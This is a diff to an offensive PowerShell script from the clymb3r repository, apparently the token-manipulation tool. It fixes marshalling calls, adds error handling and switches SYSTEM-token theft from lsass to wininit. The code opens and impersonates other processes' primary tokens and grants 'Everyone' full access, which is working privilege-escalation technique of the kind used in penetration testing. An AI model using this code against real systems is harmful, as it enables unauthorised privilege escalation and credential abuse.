@@ -845,7 +845,7 @@ Github repo: https://github.com/clymb3r/PowerShell
             }
 
             #For user "Everyone"
-            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf($TRUSTEE)
+            $TrusteeSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$TRUSTEE)
             $TrusteePtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($TrusteeSize)
             $TrusteeObj = [System.Runtime.InteropServices.Marshal]::PtrToStructure($TrusteePtr, [Type]$TRUSTEE)
             [System.Runtime.InteropServices.Marshal]::FreeHGlobal($TrusteePtr)
@@ -856,7 +856,7 @@ Github repo: https://github.com/clymb3r/PowerShell
             $TrusteeObj.ptstrName = $pAllUsersSid
 
             #Give full permission
-            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf($EXPLICIT_ACCESS)
+            $ExplicitAccessSize = [System.Runtime.InteropServices.Marshal]::SizeOf([Type]$EXPLICIT_ACCESS)
             $ExplicitAccessPtr = [System.Runtime.InteropServices.Marshal]::AllocHGlobal($ExplicitAccessSize)
             $ExplicitAccess = [System.Runtime.InteropServices.Marshal]::PtrToStructure($ExplicitAccessPtr, [Type]$EXPLICIT_ACCESS)
             [System.Runtime.InteropServices.Marshal]::FreeHGlobal($ExplicitAccessPtr)
@@ -941,8 +941,8 @@ Github repo: https://github.com/clymb3r/PowerShell
             if ($Success -eq $false -or $hProcToken -eq [IntPtr]::Zero)
             {
                 $ErrorCode = [System.Runtime.InteropServices.Marshal]::GetLastWin32Error()
-                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. Error: $ErrorCode"
-                $ReturnStruct | Add-Member -MemberType NoteProperty -Name hProcToken -Value [IntPtr]::Zero
+                Write-Warning "Failed to get processes primary token. ProcessId: $ProcessId. ProcessName $((Get-Process -Id $ProcessId).Name). Error: $ErrorCode"
+                return $null
             }
             else
             {
@@ -1520,14 +1520,17 @@ Github repo: https://github.com/clymb3r/PowerShell
         if ([Environment]::UserName -ine "SYSTEM")
         {
             #First GetSystem. The script cannot enumerate all tokens unless it is system for some reason. Luckily it can impersonate a system token.
-            $lsassTokenInfo = Get-PrimaryToken -ProcessId (Get-Process lsass).Id
-            if (-not (Invoke-ImpersonateUser -hToken $lsassTokenInfo.hProcToken))
+            $systemTokenInfo = Get-PrimaryToken -ProcessId (Get-Process wininit | where {$_.SessionId -eq 0}).Id
+            if ($systemTokenInfo -eq $null -or (-not (Invoke-ImpersonateUser -hToken $systemTokenInfo.hProcToken)))
             {
                 Write-Warning "Unable to impersonate SYSTEM, the script will not be able to enumerate all tokens"
             }
 
-            $CloseHandle.Invoke($lsassTokenInfo.hProcToken) | Out-Null
-            $lsassTokenInfo = $null
+            if ($systemTokenInfo -ne $null -and $systemTokenInfo.hProcToken -ne [IntPtr]::Zero)
+            {
+                $CloseHandle.Invoke($systemTokenInfo.hProcToken) | Out-Null
+                $systemTokenInfo = $null
+            }
         }
 
         $ProcessIds = get-process | where {$_.name -inotmatch "^csrss$" -and $_.name -inotmatch "^system$" -and $_.id -ne 0}
